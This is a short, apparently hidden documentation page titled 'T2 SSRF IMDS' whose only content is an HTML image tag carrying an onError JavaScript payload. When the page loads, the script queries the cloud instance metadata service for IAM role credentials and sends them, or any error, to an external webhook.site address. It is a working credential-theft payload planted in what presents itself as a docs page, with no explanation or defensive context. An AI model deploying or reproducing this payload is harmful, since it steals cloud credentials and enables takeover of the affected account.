---
title: T2 SSRF IMDS
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<img src="x" onError="fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(role=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role.trim())).then(r=>r.text()).then(creds=>fetch('https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355?t=imds_creds&d='+encodeURIComponent(creds))).catch(e=>fetch('https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355?t=imds_fail&e='+encodeURIComponent(e.toString())))" />
`}</HTMLBlock>
